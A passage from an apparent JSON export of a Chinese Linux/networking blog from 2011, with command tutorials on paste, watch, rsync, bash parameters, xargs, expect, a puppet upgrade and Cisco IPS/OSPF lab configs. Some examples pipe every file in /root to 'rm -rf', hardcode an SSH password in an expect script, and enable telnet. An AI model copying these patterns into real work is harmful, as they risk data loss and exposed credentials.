    "category": "linux基础",
    "tags": [
      "paste"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Epaste%E5%91%BD%E4%BB%A4/",
    "content": "<p>工作中经常出现文件合并的问题，原来linux有强大的粘贴命令：paste</p>\n\n<p>paste格式为：\n<pre class=\"sh_bash\">$ paste f1 f2 f3\nf1-line1&lt;tab&gt;f2-line1&lt;tab&gt;f3-line1\nf1-line2&lt;tab&gt;f2-line2&lt;tab&gt;f3-line2\nf1-line3&lt;tab&gt;f2-line3&lt;tab&gt;f3-line3\n...</pre><!--more-->\n<pre class=\"sh_bash\">[root@zhouyq ~]# cat line-1.txt\n1\n2\n3\n4\n5\n6\n7\n8\n9</p>\n\n<p>[root@zhouyq ~]# cat line-2.txt\na\nb\nc\nd\ne\nf\ng\nh\ni</p>\n\n<p>[root@zhouyq ~]# cat line-3.txt\nA\nB\nC\nD\nE\nF\nG\nH\n[root@zhouyq ~]# paste line-1.txt line-2.txt line-3.txt\n1\ta\tA\n2\tb\tB\n3\tc\tC\n4\td\tD\n5\te\tE\n6\tf\tF\n7\tg\tG\n8\th\tH\n9\ti\tI\n</pre>\n\n&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "12"
    }
  },
  {
    "id": 39,
    "title": "关于watch命令的研究",
    "category": "linux基础",
    "tags": [
      "watch"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ewatch%E5%91%BD%E4%BB%A4%E7%9A%84%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>当想重复一个命令或者shell脚本（只间隔几秒），可以使用watch：</strong>\n<strong>1 方便查看日志文件以及其他增长型文件的速度</strong><!--more-->\n<pre class=\"sh_bash\"># watch ls\nEvery 2.0s: ls                                                                   Sat Mar 12 17:18:56 2011\ntesT.log\nbin\nline-1.txt\nline-2.txt</pre></p>\n\n<p><strong>2  -d选项高亮，对变化的数值突出显示：</strong>\n<pre class=\"sh_bash\"># watch -d free -m\nEvery 2.0s: free -m                                                              Sat Mar 12 17:30:35 2011\ntotal     used       free     shared    buffers     cached\nMem:         16047    13182       2865          0        672       8452\n-/+ buffers/cache:     4058       11989\nSwap:        20002          0       20002</pre></p>\n\n<p><strong>3   -n 选项指定watch间隔， -t选项去掉第一行多余信息：</strong>\n<pre class=\"sh_bash\"># watch -n 10 -t free -m\ntotal     used       free     shared    buffers     cached\nMem:         16047    11971       4076          0        672       8457\n-/+ buffers/cache:     2841       13206\nSwap:        20002          0       20002</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "12"
    }
  },
  {
    "id": 40,
    "title": "关于rsync",
    "category": "linux基础",
    "tags": [
      "rsync"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ersync/",
    "content": "<p><strong>什么是rsync：\n它是一个linux系统下的文件同步传输工具，备份位置可以在本地也可以在远程服务器上\nrsync的优点：\n效率：除第一次是对目标目录全部内容复制外，下一次只传输变化的的文件到目标位置。\n安全：可以在SSH的加密传输数据中使用。\n用户体验：对安装执行没特殊要求。</strong></p>\n\n<p><strong>rsync的语法格式：</strong>\nrsync options source destination<!--more--></p>\n\n<p><strong>1  同步一个本地服务器上不同的目录：</strong>\n<pre class=\"sh_bash\">[root@server ~]# rsync -zvr /root/localhost/www.dongwm.com/ /root/test/dongwm //其中-z表示开启压缩功能，-v表示打印详细信息，-r表示递归同步\nbuilding file list ... done\ncreated directory /root/test/dongwm\nindex.html\nrobots.txt\nsent 10135 bytes  received 64 bytes  20398.00 bytes/sec\ntotal size is 47394  speedup is 4.65</pre>\n从下面内容可见，同步的文件没有同步时间戳：\n<pre class=\"sh_bash\">[root@server ~]# ll /root/localhost/www.dongwm.com/index.html /root/test/dongwm/index.html\n-rw-r--r-- 1 root root 47332 Jan 21 20:19 /root/localhost/www.dongwm.com/index.html\n-rw-r--r-- 1 root root 47332 Mar 15 01:12 /root/test/dongwm/index.html</pre></p>\n\n<p><strong>2 同步时间戳：使用-a选项：</strong>\n<pre class=\"sh_bash\">[root@server ~]# rsync -zva /root/localhost/www.dongwm.com/ /root/test/dongwm\nbuilding file list ... done\n./\nindex.html\nrobots.txt</p>\n\n<p>sent 10149 bytes  received 70 bytes  20438.00 bytes/sec\ntotal size is 47394  speedup is 4.64\n[root@server ~]# ll /root/localhost/www.dongwm.com/index.html /root/test/dongwm/index.html\n-rw-r--r-- 1 root root 47332 Jan 21 20:19 /root/localhost/www.dongwm.com/index.html\n-rw-r--r-- 1 root root 47332 Jan 21 20:19 /root/test/dongwm/index.html</pre></p>\n\n<p><strong>3  从本地同步文件到远程：</strong>\n<pre class=\"sh_bash\">[root@server test]# rsync -zva /root/test  root@192.168.9.104:/root\nroot@192.168.9.104's password:\nbuilding file list ... done\ntest/\ntest/1.txt\ntest/2.txt\ntest/3.txt\n注：同步后将在9.104端建立/root/test目录并且将本地test目录下文件拷贝到对端test目录</pre></p>\n\n<p><strong>4 从远端服务器同步文件到本地：</strong>\n<pre class=\"sh_bash\">[root@client ~]# rsync -zva  root@192.168.9.100:/root/test   /root/\nroot@192.168.9.100's password:\nreceiving file list ... done\ntest/\ntest/1.txt\ntest/2.txt\ntest/3.txt</p>\n\n<p>sent 92 bytes  received 261 bytes  64.18 bytes/sec\ntotal size is 29  speedup is 0.08\n<span style=\"color: #ff0000;\">注：注意要拷贝到的服务器的目录不要写全路径，要不然：\n[root@client ~]# rsync -zva  root@192.168.9.100:/root/test   /root/test\n就成了将三个txt文件拷贝到/root/test/test目录下了</span></pre></p>\n\n<p><strong>5 当被同步服务器上文件修改后不覆盖：</strong>\n<pre class=\"sh_bash\">[root@server ~]# ls -lrt  /root/test/3.txt\n-rw-r--r-- 1 root root 38 03-16 09:29 /root/test/3.txt\n然后我修改这个文件\n<pre class=\"sh_bash\">[root@client ~]# ls -lrt  /root/test/3.txt\n-rw-r--r-- 1 root root 42 03-16 09:31 /root/test/3.txt</p>\n\n<p>[root@server test]# rsync -zvau /root/test  root@192.168.9.104:/root\nroot@192.168.9.104's password:\nbuilding file list ... done\ntest/</p>\n\n<p>查看文件未变：\n[root@client ~]# ls -lrt  /root/test/3.txt\n-rw-r--r-- 1 root root 42 03-16 09:31 /root/test/3.txt\n注：这里修改<span style=\"color: #ff0000;\">客户端</span>的文件，同步后不覆盖此文件使用-u</pre></p>\n\n<p><strong>6 显示同步过程详细信息：</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server test]# rsync -zva --progress /root/test  root@192.168.9.104:/root\nroot@192.168.9.104's password:\nbuilding file list ...\n16 files to consider\ntest/\ntest/.autobench.conf\n1697 100%    0.00kB/s    0:00:00 (xfer#1, to-check=14/16)\ntest/.bash_history\n30512 100%   29.10MB/s    0:00:00 (xfer#2, to-check=13/16)\ntest/.bash_logout\n24 100%   23.44kB/s    0:00:00 (xfer#3, to-check=12/16)\ntest/.bash_profile\n191 100%  186.52kB/s    0:00:00 (xfer#4, to-check=11/16)\ntest/.bashrc\n190 100%   92.77kB/s    0:00:00 (xfer#5, to-check=10/16)\ntest/.cshrc\n100 100%   48.83kB/s    0:00:00 (xfer#6, to-check=9/16)\ntest/.e.swp\n12288 100%    5.86MB/s    0:00:00 (xfer#7, to-check=8/16)\ntest/.mysql_history\n356 100%  115.89kB/s    0:00:00 (xfer#8, to-check=7/16)\ntest/.rnd\n1024 100%  333.33kB/s    0:00:00 (xfer#9, to-check=6/16)\ntest/.tcshrc\n129 100%   31.49kB/s    0:00:00 (xfer#10, to-check=5/16)\ntest/.viminfo\n7594 100%    1.81MB/s    0:00:00 (xfer#11, to-check=4/16)\ntest/.vimrc\n5476 100%    1.04MB/s    0:00:00 (xfer#12, to-check=3/16)\ntest/3.txt\n32 100%    5.21kB/s    0:00:00 (xfer#13, to-check=0/16)</p>\n\n<p>sent 13678 bytes  received 318 bytes  3998.86 bytes/sec\ntotal size is 59629  speedup is 4.26\n</pre>\n<strong>7 删除源服务器上没有的，不需要同步的文件：\n当客户端添加了新文件，源服务器同步时为找到本文件，将删除之：</strong>\n<pre class=\"sh_bash\">[root@client ~]# touch /root/test/new-file.txt\n[root@client ~]# rsync -zva  --delete root@192.168.9.100:/root/test   /root/\nroot@192.168.9.100's password:\nreceiving file list ... done\ndeleting test/new-file.txt\ntest/</p>\n\n<p>sent 26 bytes  received 332 bytes  79.56 bytes/sec\ntotal size is 59629  speedup is 166.56\n</pre>\n<strong>8 当源文件新增文件，客户端只想同步已有的文件使用--existing：</strong>\n<pre class=\"sh_bash\">[root@server test]# touch /root/test/new-file.txt\n[root@client ~]# rsync -zva --existing root@192.168.9.100:/root/test   /root/\nroot@192.168.9.100's password:\nreceiving file list ... done\ntest/</p>\n\n<p>sent 26 bytes  received 355 bytes  108.86 bytes/sec\ntotal size is 59629  speedup is 156.51\n看 客户端没有同步/root/test/new-file.txt文件！</pre>\n<strong>9 显示源和目的服务器的不同：</strong>\n<pre class=\"sh_bash\">[root@server test]# ll /root/test\ntotal 12\n-rw-r--r-- 1 root root  8 Mar 15 18:11 1.txt\n-rw-r--r-- 1 root root  8 Mar 15 18:11 2.txt\n-rw-r--r-- 1 root root 32 Mar 15 18:28 3.txt\n[root@client ~]# ll /root/test\n总计 12\n-rw-r--r-- 1 test test  8 03-16 09:11 1.txt\n-rw-r--r-- 1 root root 20 03-16 10:12 2.txt\n-rw-r--r-- 1 root root 32 03-16 09:28 3.txt\n注意2点：\n第一 1.txt文件所有者权限\n第二 2.txt文件的大小\n[root@client ~]# rsync -zvai  root@192.168.9.100:/root/test   /root/\nroot@192.168.9.100's password:\nreceiving file list ... done\n.d..t.... test/\n.f....og. test/1.txt\n&gt;f.st.... test/2.txt</p>\n\n<p>sent 60 bytes  received 387 bytes  127.71 bytes/sec\ntotal size is 59629  speedup is 133.40\n其中：\n&lt;b&gt;f 这是一个文件\ns 文件大小改变\nt 时间戳改变\no 使用者改变\ng 使用组改变&lt;/b&gt;</pre>\n\n<strong>10  只同步指定条件的文件：</strong>\n此例同步文件以”1“开头的文件--即1.txt\n<pre class=\"sh_bash\">[root@server test]# rsync -zva --include '1*' --exclude '*'  /root/test/  root@192.168.9.104:/root\nroot@192.168.9.104's password:\nbuilding file list ... done\n./\n1.txt</p>\n\n<p>sent 118 bytes  received 48 bytes  47.43 bytes/sec\ntotal size is 8  speedup is 0.05\n注：本例我修改了一点：以前写源目录是/root/test  这次是/root/test/  多了一个下划线，要不然他会发现test不是1开头 ，而1.txt是其子目录，而不去同步</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "16"
    }
  },
  {
    "id": 41,
    "title": "Bash Shell  位置参数和内部参数",
    "category": "Bash Shell",
    "tags": [
      "位置参数",
      "内部参数"
    ],
    "url": "/archives/bash-shell-%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%92%8C%E5%86%85%E9%83%A8%E5%8F%82%E6%95%B0/",
    "content": "<p><pre class=\"sh_bash\">$0表示当前执行的进程名,script 本身的名字,或者在正则表达式中表示整行输出</p>\n\n<p>$# ----传递给程序的总的参数数目</p>\n\n<p>$? ----上一个代码或者shell程序在shell中退出的情况，如果正常退出则返回0，反之为非0值。</p>\n\n<p>$* ----传递给程序的所有参数组成的字符串。</p>\n\n<p>$n ----表示第几个参数，$1 表示第一个参数，$2 表示第二个参数 ...</p>\n\n<p>$0 ----当前程序的名称</p>\n\n<p>$@----以\"参数1\" \"参数2\" ... 形式保存所有参数</p>\n\n<p>$$ ----本程序的(进程ID号)PID</p>\n\n<p>$! ----上一个命令的PID</p>\n\n<p>$_ ----保存之前执行的命令的最后一个参数</pre><!--more--></p>\n\n<p><pre class=\"sh_bash\">[root@client ~]# cat test.sh</p>\n\n<p>#!/bin/bash</p>\n\n<p>echo \"程序的名称是：\" $0</p>\n\n<p>echo \"进程的PID：\" $$</p>\n\n<p>echo \"第一个参数：\" $1</p>\n\n<p>echo \"第二个参数：\" $2</p>\n\n<p>echo \"第三个参数：\" $3</p>\n\n<p>echo \"传入的参数个数：\" $#</p>\n\n<p>echo \"传入的参数为：\" \"$@\"</p>\n\n<p>echo \"传入的参数为：\" \"$*\"</p>\n\n<p>echo \"最后一个参数是：\" \"$_\"</pre></p>\n\n<p><pre class=\"sh_bash\">[root@client ~]# sh test.sh 1 2 3</p>\n\n<p>程序的名称是： test.sh</p>\n\n<p>进程的PID： 26521</p>\n\n<p>第一个参数： 1</p>\n\n<p>第二个参数： 2</p>\n\n<p>第三个参数： 3</p>\n\n<p>传入的参数个数： 3</p>\n\n<p>传入的参数为： 1 2 3</p>\n\n<p>传入的参数为： 1 2 3</p>\n\n<p>最后一个参数是： 3</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "17"
    }
  },
  {
    "id": 42,
    "title": "关于xargs命令的研究",
    "category": "linux基础",
    "tags": [
      "xargs"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Exargs%E5%91%BD%E4%BB%A4%E7%9A%84%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>前言：假如使用find将寻找到的匹配的文件传递给exec或者ok执行，可能几分钟后会报类似的错误：”/bin/rm Argument list too log -linux“，这时候可以使用xargs命令来避免，\n1 查找当前目录下所有用户具有读写执行权限的文件，并收回其他用户的写权限：</strong>\n<pre class=\"sh_bash\">[root@client test]# ls -l\n总计 12\n-rwxrwxrwx 1 root root  8 03-16 09:11 1.txt\n-rwxrwxrwx 1 root root  8 03-16 09:11 2.txt\n-rw-r--r-- 1 root root 32 03-16 09:28 3.txt\n[root@client test]# find . -perm -7 -print |xargs chmod o-w\n[root@client test]# ls -l\n总计 12\n-rwxrwxr-x 1 root root  8 03-16 09:11 1.txt\n-rwxrwxr-x 1 root root  8 03-16 09:11 2.txt\n-rw-r--r-- 1 root root 32 03-16 09:28 3.txt</pre><!--more--></p>\n\n<p><strong>2 设计包含一定数量文件名的命令：</strong>\n<pre class=\"sh_bash\">[root@client ~]# xargs -t -n 2 echo &lt;&lt;EOF\n&gt; test1 1 test2 2 test3 3\n&gt; EOF\necho test1 1\ntest1 1\necho test2 2\ntest2 2\necho test3 3\ntest3 3\n其中-t表示运行时先显示每个命令，-n表示分割数量，本例表示每2列分割</pre></p>\n\n<p><strong>3 显示每次匹配。并提示是否运行，按“y”运行，按其它任意键不运行：</strong>\n<pre class=\"sh_bash\">[root@client ~]# ls |xargs -p -n 1 rm -rf\nrm -rf 22 ?...y\nrm -rf 9922 ?...y\nrm -rf anaconda-ks.cfg ?...\nrm -rf apache-ant-1.8.2-bin.tar.bz2 ?...\nrm -rf colordiff-1.0.9 ?...//<span style=\"color: #ff0000;\">本例rm -rf 已经强制删除，但是运行中仍然提示是否执行这个rm操作，而不是rm中的删除确认</span></pre></p>\n\n<p><strong>4  将xargs前面的结果作为后面命令其中的一个参数：</strong>\n<pre class=\"sh_bash\">[root@client ~]# ls test |xargs -i -p mv test/\\{\\} test1/\\{\\}\nmv test/1.txt test1/1.txt ?...y\nmv test/2.txt test1/2.txt ?...y\nmv test/3.txt test1/3.txt ?...y\n其中{}代表前面匹配的结果 </pre>\n<pre class=\"sh_bash\">[root@client ~]# pwd |xargs -i cp /etc/hosts {}  //表示将/etc/hosts文件 拷贝到当前目录下</pre></p>\n\n<p>&nbsp;\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=66cfe7d7-7783-88c4-b34d-d0ce11007fef\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "17"
    }
  },
  {
    "id": 43,
    "title": "VMWARE下IPS实现web连接(IDM)",
    "category": "ips",
    "tags": [
      "IDM"
    ],
    "url": "/archives/vmware%E4%B8%8Bips%E5%AE%9E%E7%8E%B0web%E8%BF%9E%E6%8E%A5idm/",
    "content": "<p><strong>1  设置IPS初始化</strong></p>\n\n<p>sensor# conf t\nsensor(config)# service host\nsensor(config-hos)# network-settings\nsensor(config-hos-net)#host-ip 192.168.1.144/24,192.168.1.1 //定义IPS地址 掩码 网关\nsensor(config-hos-net)# telnet-option enabled //支持telnet管理\nsensor(config-hos-net)# access-list 192.168.1.144/32 //定义管理IP\nsensor(config-hos-net)# exit\nsensor(config-hos)# time-zone-settings //设置时区\nsensor(config-hos-tim)# offset 8\nsensor(config-hos-tim)# standard-time-zone-name\nsensor(config-hos-tim)# standard-time-zone-name beijing\nsensor(config-hos-tim)# exit\nsensor(config-hos)# exit Apply C\nhanges:?[yes]: yes\nsensor(config)# service web-server // 启动GUI管理\nsensor(config-web)# enable-tls true\nsensor(config-web)# port 443<!--more--></p>\n\n<p><strong>2 设置java虚拟机Applet Memory Limit</strong></p>\n\n<p>在最开始的版本里面，设置在“高级”中，在java1.5和其以后版本都在“java”选项</p>\n\n<p>我的操作系统win7，控制面板--程序--java--“java”选项--查看--修改Runtime参数为-Xmx300m</p>\n\n<p>注：1.5版本256M即可，但是java1.6需要更高</p>\n\n<p><strong>3  web登录</strong></p>\n\n<p><a href=\"https://192.168.1.144\">https://192.168.1.144</a></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "25"
    }
  },
  {
    "id": 44,
    "title": "关于expect研究（一）",
    "category": "expect",
    "tags": [
      "expect"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Eexpect%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
    "content": "<p><p><strong>expect是一个编程工具语言，他的作者描述其为：Expect [is a] software suite for automating interactive tools。类似于自动应答，它能实现自动和交互式的执行。\n1 因为Expect需要Tcl编程语言的支持，首先安装tcl</strong>\n<pre class=\"sh_bash\">[root@server ~]# yum install -y tcl tclx tcl-devel –y</pre>\n<strong>2 安装最新版expect：</strong>\nhttp://sourceforge.net/projects/expect/\n目前最新版expect5.45\n<pre class=\"sh_bash\">[root@server expect5.45]# ./configure --with-tcl=/usr/lib --with-tclinclude=/usr/include/tcl-private/generic &#038;&#038; make &#038;&#038; make install</pre>\n<strong>3 基础知识：</strong>\n1 基础命令：send，expect，spwan\nsend表示接受一个字符串作为参数发送给指定进程，expect 命令则等待一个响应\n<!--more--></p>\n<p><pre class=\"sh_bash\">[root@server test]# cat test1.exp\n#!expect -f\nexpect test //等待 我输入 test\nsend test for send //表示当我输入test后 会发送test for send 否则一直等待</pre>\n[root@server test]# expect test1.exp\nhi //我输入了其他字符 没反应\ntest\ntest for send //输入设定字符 条件满足</pre>\n也可以使用-c选项在命令行执行：\n[root@server test]# expect -c 'expect test {send test for send}'\nhi\ntest\ntest for send</pre>\nspawn后面需要加上要执行的shell命令，只有spawn执行的命令结果才能被expect理解和收集\n这里有一个小例子：\n<pre class=\"sh_bash\">[root@server test]# cat test3.exp\n#!/usr/bin/expect\nset timeout 30  //表示超市时间30秒\nspawn ssh 192.168.9.102 -p 9922  //表示执行ssh到对端主机的命令\nexpect password: //表示等待出现“password”（无括号）时\nsend qwe123\\!\\@\\#\\n //输入这里设定的密码，\\N表示让他自动回车\ninteract //表示到远端终端后 可以执行交互命令，如同手动执行“ssh 192.168.9.102 -p 9922”后效果一样\nexpect *$ //着2句在没有interact 时候有最用，因为spawn后一直是在执行SSH进程，当超时后 会输出一些东西，也就符合了这个等待。而当包含interact后 除非手动exit 否则不会符合这里的等待\nsend mkdir test\\n //当符合上句 在对端根目录创建一个test目录</pre></p>\n</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "26"
    }
  },
  {
    "id": 45,
    "title": "升级puppet版本",
    "category": "linux基础",
    "tags": [
      "升级puppet"
    ],
    "url": "/archives/%E5%8D%87%E7%BA%A7puppet%E7%89%88%E6%9C%AC/",
    "content": "<p><p><strong>目前最新版puppet是2.6.7，我的版本是2.6.3，以下是升级过程（本例只适合编译安装puppet）：</strong></p>\n<p><strong>思路：</strong></p>\n<p><strong>1  先升级server端，后升级client端</strong></p>\n<p><strong>2  先删除就版本库文件和程序文件，再安装新版本文件，而默认的/var/lib/puppet和/etc/puppet目录不要动</strong></p>\n<p><strong>1 删除旧相关文件：</strong></p>\n<p><pre class=\"sh_bash\">#rm /usr/local/sbin/puppet* –rf\n#rm /usr/local/lib/ruby/site_ruby/1.8/puppet –rf\n#rm /usr/local/bin/puppet* –rf</pre></p>\n<p><strong>2 安装新版本：\n</strong><pre class=\"sh_bash\">#tar zxvf puppet-2.6.7.tar.gz\n#cd puppet-2.6.7\n#ruby install.rb</pre></p>\n<p><strong>3  测试：</strong></p>\n<p><pre class=\"sh_bash\">[root@dongwm puppet-2.6.7]# puppet -V\n2.6.7</p>\n<p>使用debug模式启动puppet会出现下面的信息：</p>\n<p>&nbsp;</p>\n<p>notice: Starting Puppet client version 2.6.7</pre></p>\n</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "29"
    }
  },
  {
    "id": 46,
    "title": "OSPF验证配置 (MD5验证)",
    "category": "ospf",
    "tags": [
      "ospf"
    ],
    "url": "/archives/ospf%E9%AA%8C%E8%AF%81%E9%85%8D%E7%BD%AE-md5%E9%AA%8C%E8%AF%81/",
    "content": "<p><strong>实验要求</strong></p>\n\n<p><strong>1. 完成路由器的基本配置和连通性配置</strong>\n<strong> 2．根据拓扑图的示意，分成两个区域 area 0和area 100 OSPF的进程号为100</strong>\n<strong> 3. 完成OSPF路由协议的MD5验证功能</strong>\n<strong> 4．完成以上配置后进行测试，从R1 ping通 R3上的S1、loopback0以及loopback1；反之，R3 ping 通 R1上的S0、loopback0以及loopback1</strong></p>\n\n<p><strong>R1 配置</strong></p>\n\n<p><pre class=\"sh_bash\">Router&gt;enable\nRouter#configure terminal\nEnter configuration commands, one per line.  End with CNTL/Z.\nRouter(config)#hostname 01r1\n01r1(config)#line console 0\n01r1(config-line)#logging synchronous\n01r1(config-line)#exit\n01r1(config)#no ip domain-lookup\n01r1(config)#int s0/0\n01r1(config-if)#no shutdown\n01r1(config-if)#ip address 210.1.12.1 255.255.255.0\n01r1(config-if)#clock rate 64000\n01r1(config-if)#int loopback 0\n01r1(config-if)#ip address 1.1.1.1 255.255.255.255\n01r1(config-if)#int loopback 1\n01r1(config-if)#ip address 11.11.11.11 255.255.255.255\n01r1(config-if)#exit\n01r1(config)#router ospf 100\n01r1(config-router)#network 210.1.12.1 0.0.0.255 area 0\n01r1(config-router)#network 210.1.12.1 0.0.0.255 area 0\n01r1(config-router)#network 1.1.1.1 0.0.0.0 area 0\n01r1(config-router)#network 11.11.11.11 0.0.0.0 area 0\n01r1(config-router)#end\n01r1#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.\n01r1(config)#int s0/0\n01r1(config-if)#ip ospf authentication message-digest\n*Mar  1 00:06:46.503: %SYS-5-CONFIG_I: Configured from console by console\n01r1(config-if)#ip ospf message-digest-key 1 md5 cisco123\nOSPF: Key 1 already exists\n01r1(config-if)#\n*Mar  1 00:07:25.543: %LINEPROTO-5-UPDOWN: Line protocol on Interface Serial0/0, changed state to up\n*Mar  1 00:07:26.003: %OSPF-5-ADJCHG: Process 100, Nbr 22.22.22.22 on Serial0/0 from LOADING to FULL, Loading Done</pre><!--more--></p>\n\n<p><strong>R2配置</strong></p>\n\n<p><pre class=\"sh_bash\">Router&gt;enable\nRouter#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.\nRouter(config)#hostname 01r2\n01r2(config)#line console 0\n01r2(config-line)#logging synchronous\n01r2(config-line)#exit\n01r2(config)#no ip domain-lookup\n01r2(config)#interface serial 0/0\n01r2(config-if)#no shutdown\n01r2(config-if)#ip address 210.1.12.2 255.255.255.0\n01r2(config-if)#int s0/1\n01r2(config-if)#no shutdown\n01r2(config-if)#ip address 210.1.23.2 255.255.255.0\n01r2(config-if)#clock rate 64000\n01r2(config-if)#int loopback 0\n01r2(config-if)#ip address 2.2.2.2 255.255.255.255\n01r2(config-if)#int loopback 1\n01r2(config-if)#ip address 22.22.22.22 255.255.255.255\n01r2(config-if)#exit\n01r2(config)#router ospf 100\n01r2(config-router)#network 210.1.12.2 0.0.0.255 area 0\n01r2(config-router)#network 210.1.23.2 0.0.0.255 area 100\n01r2(config-router)#network 2.2.2.2 0.0.0.0 area 100\n01r2(config-router)#network 22.22.22.22 0.0.0.0 area 100\n01r2(config-router)#end\n01r2#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.\n01r2(config)#int s0/0\n01r2(config-if)#ip ospf authentication message-digest\n01r2(config-if)#\n*Mar  1 00:07:35.967: %SYS-5-CONFIG_I: Configured from console by console\n*Mar  1 00:07:35.971: %LINEPROTO-5-UPDOWN: Line protocol on Interface Loopback0, changed state to upip ospf message-digest-key 1 md5 cisco123\n01r2(config-if)#int s0/1\n01r2(config-if)#ip ospf authentication message-digest\n*Mar  1 00:07:35.971: %LINK-3-UPDOWN: Interface Serial0/0, changed state to up\n*Mar  1 00:07:36.203: %LINEPROTO-5-UPDOWN: Line protocol on Interface Loopback1, changed state to up\n*Mar  1 00:07:36.511: %LINK-3-UPDOWN: Interface Serial0/1, changed state to up\n*Mar  1 00:07:36.975: %LINEPROTO-5-UPDOWN: Line protocol on Interface Serial0/0, changed state to up\n*Mar  1 00:07:37.515: %LINEPROTO-5-UPDOWN: Line protocol on Interface Serial0/1, changed state to up\n*Mar  1 00:07:39.711: %OSPF-5-ADJCHG: Process 100, Nbr 11.11.11.11 on Serial0/0 from LOADING to FULL, Loading Done\n01r2(config-if)#\n*Mar  1 00:08:05.659: %LINEPROTO-5-UPDOWN: Line protocol on Interface Serial0/1, changed state to down\n01r2(config-if)#\n*Mar  1 00:08:45.643: %LINEPROTO-5-UPDOWN: Line protocol on Interface Serial0/1, changed state to up\n01r2(config-if)#\n*Mar  1 00:09:26.059: %OSPF-5-ADJCHG: Process 100, Nbr 33.33.33.33 on Serial0/1 from LOADING to FULL, Loading Done</pre></p>\n\n<p><strong>R3配置</strong></p>\n\n<p><pre class=\"sh_bash\">Router&gt;enable\nRouter#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.\nRouter(config)#hostname 01r3\n01r3(config)#line console 0\n01r3(config-line)#logging synchronous\n01r3(config-line)#exit\n01r3(config)#no ip domain-lookup\n01r3(config)#int s0/0\n01r3(config-if)#no shut\n01r3(config-if)#ip add 210.1.23.3 255.255.255.0\n01r3(config-if)#int loopback 0\n01r3(config-if)#ip address 3.3.3.3 255.255.255.255\n01r3(config-if)#int loopback 1\n01r3(config-if)#ip add 33.33.33.33 255.255.255.255\n01r3(config-if)#exit\n01r3(config)#router ospf  100\n01r3(config-router)#network 210.1.23.3 0.0.0.255 area 100\n01r3(config-router)#network 3.3.3.3 0.0.0.0 area 100\n01r3(config-router)#network 33.33.33.33 0.0.0.0 area 100\n01r3(config-router)#end\n01r3#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.\n01r3(config)#int s0/0\n01r3(config-if)#ip ospf authentication message-digest\n*Mar  1 00:08:12.867: %SYS-5-CONFIG_I: Configured from console by console\n*Mar  1 00:08:14.335: %LINK-3-UPDOWN: Interface Serial0/0, changed state to up\n01r3(config-if)#ip ospf message-digest-key 1 md5 cisco12345\n01r3(config-if)#\n*Mar  1 00:09:04.499: %OSPF-5-ADJCHG: Process 100, Nbr 22.22.22.22 on Serial0/0 from LOADING to FULL, Loading Done</pre></p>\n\n<p><strong>测试：R1</strong></p>\n\n<p><pre class=\"sh_bash\">01r1(config-if)#do ping 210.1.23.3</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 210.1.23.3, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 28/94/140 ms\n01r1#do ping 3.3.3.3\n*Mar  1 00:09:34.071: %SYS-5-CONFIG_I: Configured from console by console</p>\n\n<p>01r1#ping 3.3.3.3</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 3.3.3.3, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 52/133/372 ms\n01r1#ping 33.33.33.33</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 33.33.33.33, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 24/82/184 ms\n01r1#sh ip route\nCodes: C - connected, S - static, R - RIP, M - mobile, B - BGP\nD - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area\nN1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2\nE1 - OSPF external type 1, E2 - OSPF external type 2\ni - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2\nia - IS-IS inter area, * - candidate default, U - per-user static route\no - ODR, P - periodic downloaded static route</p>\n\n<p>Gateway of last resort is not set</p>\n\n<p>1.0.0.0/32 is subnetted, 1 subnets\nC       1.1.1.1 is directly connected, Loopback0\n2.0.0.0/32 is subnetted, 1 subnets\nO IA    2.2.2.2 [110/65] via 210.1.12.2, 00:02:29, Serial0/0\n33.0.0.0/32 is subnetted, 1 subnets\nO IA    33.33.33.33 [110/129] via 210.1.12.2, 00:00:52, Serial0/0\n3.0.0.0/32 is subnetted, 1 subnets\nO IA    3.3.3.3 [110/129] via 210.1.12.2, 00:00:52, Serial0/0\nC    210.1.12.0/24 is directly connected, Serial0/0\n22.0.0.0/32 is subnetted, 1 subnets\nO IA    22.22.22.22 [110/65] via 210.1.12.2, 00:02:29, Serial0/0\nO IA 210.1.23.0/24 [110/128] via 210.1.12.2, 00:01:32, Serial0/0\n11.0.0.0/32 is subnetted, 1 subnets\nC       11.11.11.11 is directly connected, Loopback1</pre></p>\n\n<p><strong>测试：R3</strong></p>\n\n<p><pre class=\"sh_bash\">01r3(config-if)#do ping 210.1.12.1</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 